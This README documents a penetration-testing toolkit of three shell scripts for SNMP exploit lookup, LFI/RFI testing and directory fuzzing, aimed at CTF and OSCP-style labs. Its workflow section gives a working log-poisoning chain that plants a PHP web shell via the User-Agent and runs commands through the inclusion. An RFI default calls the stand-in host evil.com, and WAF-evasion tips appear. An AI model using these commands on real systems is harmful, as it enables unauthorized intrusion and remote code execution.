# Pen Testing Script Toolkit

> **⚠ LEGAL DISCLAIMER**
> These tools are for **authorized penetration testing and CTF use only**.
> Do not run them against systems you do not own or have **explicit written permission** to test.
> Unauthorized use may violate computer fraud laws in your jurisdiction.

---

## Table of Contents

1. [Requirements](#requirements)
2. [snmp\_searchsploit.sh](#snmp_searchsploitsh) — SNMP enumeration + exploit lookup
3. [lfi\_rfi\_tester.sh](#lfi_rfi_testersh) — LFI / RFI vulnerability tester
4. [dir\_fuzz.sh](#dir_fuzzsh) — Directory and file fuzzer
5. [Typical Workflow](#typical-workflow)

---

## Requirements

Install the following before using any script:

```bash
# Core tools
sudo apt install ffuf jq nmap curl

# SecLists wordlists (used by lfi_rfi_tester and dir_fuzz)
sudo apt install seclists

# ExploitDB / searchsploit (used by snmp_searchsploit)
sudo apt install exploitdb

# dirbuster wordlists (used by dir_fuzz)
sudo apt install dirb
```

Make all scripts executable:

```bash
chmod +x snmp_searchsploit.sh lfi_rfi_tester.sh dir_fuzz.sh
```

---

## snmp_searchsploit.sh

Parses nmap SNMP scan output, extracts product and version strings, then queries
`searchsploit` for known exploits against each one.

### Options

| Flag | Description | Default |
|---|---|---|
| `-f <file>` | nmap output file to parse (use `-` for stdin) | — |
| `-t <target>` | Run a live nmap SNMP scan then search | — |
| `-c <community>` | SNMP community string | `public` |
| `-o <file>` | Save results to a file | — |
| `-j` | Also write a JSON summary | off |
| `-v` | Verbose — show terms even with no hits | off |

### Examples

**Parse a saved nmap output file:**
```bash
./snmp_searchsploit.sh -f scan.nmap
```

**Run a live SNMP scan against a target:**
```bash
./snmp_searchsploit.sh -t 10.10.10.5
```

**Scan a subnet with a non-default community string:**
```bash
./snmp_searchsploit.sh -t 192.168.1.0/24 -c private
```

**Save results and generate a JSON summary:**
```bash
./snmp_searchsploit.sh -t 10.10.10.5 -o snmp_results.txt -j
```

**Pipe nmap output directly:**
```bash
nmap -sU -p 161 --script snmp-info 10.10.10.5 | ./snmp_searchsploit.sh -f -
```

**Verbose — show all search terms even when nothing is found:**
```bash
./snmp_searchsploit.sh -f scan.nmap -v
```

### What it detects

The script extracts and searches for:

- `sysDescr` strings (Cisco IOS, Juniper, Net-SNMP, Windows, Linux kernel versions)
- Software names from `snmp-win32-software` script output
- Version strings following `Version X.X` patterns
- Common server banners (Apache, IIS, OpenSSH, vsftpd, Postfix, ProFTPD)

### Output files

| File | Contents |
|---|---|
| `<outfile>.txt` | Searchsploit results per term (with `-o`) |
| `<outfile>.json` | JSON summary with match counts per term (with `-j`) |

---

## lfi_rfi_tester.sh

Tests a URL parameter for Local File Inclusion (LFI) and Remote File Inclusion (RFI)
vulnerabilities using the Jhaddix wordlist from SecLists (~920 payloads).

### Options

| Flag | Description | Default |
|---|---|---|
| `-u <url>` | Target URL with `FUZZ` placeholder | — |
| `-p <param>` | Parameter name to inject instead of `FUZZ` | — |
| `-t <type>` | Test type: `lfi`, `rfi`, or `both` | `both` |
| `-w <path>` | Path to a custom LFI wordlist | auto-resolved |
| `-r <url>` | Remote URL for RFI payloads | `http://evil.com/test.txt` |
| `-c <cookie>` | Cookie string | — |
| `-H <header>` | Extra HTTP header | — |
| `-o <file>` | Save confirmed hits to file | — |
| `-d <secs>` | Delay between requests | `0` |
| `-x` | Stop after first confirmed vulnerability | off |
| `-v` | Verbose — show all tested payloads | off |

### Wordlist resolution order

The script locates `LFI-Jhaddix.txt` automatically:

1. `-w <path>` if you supply one
2. Common SecLists install paths (`/usr/share/seclists`, `/opt/SecLists`, `~/SecLists`, Homebrew)
3. Cached copy at `/tmp/LFI-Jhaddix.txt` from a previous run
4. Downloaded at runtime from GitHub if not found locally

### Examples

**Basic LFI/RFI test with FUZZ in URL:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?file=FUZZ"
```

**LFI only, using a named parameter:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/index.php" -p page -t lfi
```

**Stop on first hit and save results:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/view.php?f=FUZZ" -x -o lfi_hits.txt
```

**Test with a session cookie:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?f=FUZZ" -c "PHPSESSID=abc123"
```

**RFI test pointing at your own server:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/load.php?f=FUZZ" -t rfi -r http://10.10.14.5/probe.txt
```

**Use a custom wordlist:**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt
```

**Rate-limited requests (useful against WAFs):**
```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?f=FUZZ" -d 0.5
```

### What it detects

| Signature | Indicates |
|---|---|
| `root:x:0:0` | `/etc/passwd` read — LFI confirmed |
| `[fonts]`, `[boot loader]` | Windows INI / hosts file read |
| Long base64 blob | `php://filter` source disclosure |
| `PATH=`, `DOCUMENT_ROOT=` | `/proc/self/environ` leak |
| Ubuntu / Debian / CentOS strings | `/etc/os-release` or `/etc/issue` read |
| `"GET `, `HTTP/1.1` in body | Web server log read — log poisoning possible |
| Response size delta > 200 bytes | Anomalous — investigate manually |

### RFI note

RFI requires the target PHP config to have `allow_url_include = On` and
`allow_url_fopen = On`. These are off by default in modern PHP but occasionally
enabled on misconfigured servers.

---

## dir_fuzz.sh

Runs multiple `ffuf` directory and file fuzzing scans against a target using the
wordlists from SecLists and dirbuster. All results are saved as JSON and parsed
into a colour-coded summary at the end.

### Options

| Flag | Description | Default |
|---|---|---|
| `-t <target>` | Target IP or hostname | — |
| `-p <port>` | Port | `80` / `443` with `-s` |
| `-s` | Use HTTPS | off |
| `-m <mode>` | Scan mode: `dirs`, `files`, or `both` | `both` |
| `-e <exts>` | Comma-separated extensions for file scan | `.php,.asp,.aspx,.jsp,.html,.txt,.json` |
| `-c <cookie>` | Cookie string | — |
| `-H <header>` | Extra HTTP header | — |
| `-T <threads>` | Threads for file scans | `50` |
| `-o <dir>` | Output directory | `./ffuf_<target>_<timestamp>` |
| `-r <depth>` | Recursion depth | `1` |
| `-f <codes>` | Filter HTTP status codes, e.g. `404,403` | — |
| `-z <size>` | Filter response size | — |
| `-q` | Quiet — suppress ffuf banner/progress | off |

### Wordlists used

**Directory scans** (`-recursion -recursion-depth 1`):

| Label | Wordlist path |
|---|---|
| raft-large-directories | `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` |
| big | `/usr/share/seclists/Discovery/Web-Content/big.txt` |
| dirbuster-medium | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
| raft-large-words | `/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt` |

**File scans** (`-t 50` + extensions):

| Label | Wordlist path |
|---|---|
| big | `/usr/share/seclists/Discovery/Web-Content/big.txt` |
| common | `/usr/share/seclists/Discovery/Web-Content/common.txt` |
| raft-large-words | `/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt` |

Missing wordlists are skipped with a warning rather than crashing the script.

### Examples

**Basic scan against a target:**
```bash
./dir_fuzz.sh -t 10.10.10.5
```

**Non-standard port:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -p 8080
```

**HTTPS target:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -s -p 443
```

**Directory scan only:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -m dirs
```

**File scan only with extra extensions:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -m files -e ".php,.bak,.old,.zip,.tar.gz"
```

**Filter 404s and save to a custom output directory:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -f 404 -o ./htb_results
```

**With a session cookie:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -c "PHPSESSID=abc123"
```

**Increase recursion depth and threads:**
```bash
./dir_fuzz.sh -t 10.10.10.5 -r 2 -T 100
```

**Filter by response size (useful when every path returns 200):**
```bash
./dir_fuzz.sh -t 10.10.10.5 -z 1234
```

### Output files

All output lands in the timestamped output directory:

| File | Contents |
|---|---|
| `dirs-<wordlist>.json` | ffuf JSON per directory wordlist |
| `files-<wordlist>.json` | ffuf JSON per file wordlist |
| `all_results.tsv` | Deduplicated `status\turl` across all scans |

**Manually parse results at any time:**
```bash
# All directory hits
cat ./ffuf_*/dirs-*.json | jq -r '.results[] | [.status,.url] | @tsv' | sort -u

# All file hits
cat ./ffuf_*/files-*.json | jq -r '.results[] | [.status,.url] | @tsv' | sort -u

# 200s only
awk '$1 == 200' ./ffuf_*/all_results.tsv
```

---

## Typical Workflow

A standard enumeration chain for a web target on HTB / OSCP-style boxes:

```bash
TARGET="10.10.10.5"

# 1. SNMP enumeration — discover software versions, check for known exploits
./snmp_searchsploit.sh -t $TARGET -o snmp_results.txt -j

# 2. Directory and file fuzzing — map the full web surface
./dir_fuzz.sh -t $TARGET -f 404 -o ./enum_$TARGET

# 3. Once a file inclusion parameter is identified, test it
./lfi_rfi_tester.sh -u "http://$TARGET/page.php?file=FUZZ" -x -o lfi_results.txt
```

**Chaining LFI into log poisoning:**
```bash
# 1. Confirm LFI reads the Apache access log
./lfi_rfi_tester.sh -u "http://$TARGET/page.php?f=FUZZ" -t lfi

# 2. Poison the log by injecting PHP into the User-Agent
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://$TARGET/"

# 3. Include the poisoned log and execute commands
curl "http://$TARGET/page.php?f=/var/log/apache2/access.log&cmd=id"
```

**Piping nmap directly into SNMP searchsploit:**
```bash
nmap -sU -p 161 --script snmp-info,snmp-sysdescr $TARGET \
  | ./snmp_searchsploit.sh -f - -o snmp_hits.txt
```

---

## Tips

- **WAF evasion** — use `-d 0.5` in `lfi_rfi_tester` and lower `-T` threads in `dir_fuzz` to reduce request rate.
- **HTTPS targets** — pass `-s` to `dir_fuzz`; `lfi_rfi_tester` follows whatever scheme you put in the URL.
- **Virtual hosting** — if the target resolves by hostname, use the hostname not the IP, or pass `-H "Host: target.htb"`.
- **Auto-calibration** — if `dir_fuzz` returns too many false positives, add `-z <size>` matching the junk response size.
- **SecLists not installed** — `lfi_rfi_tester` auto-downloads `LFI-Jhaddix.txt` from GitHub and caches it in `/tmp`; `dir_fuzz` warns and skips any missing wordlists rather than failing.
- **Output files** — all three scripts support `-o` for saving; combine with `tee` to see live output and save simultaneously.
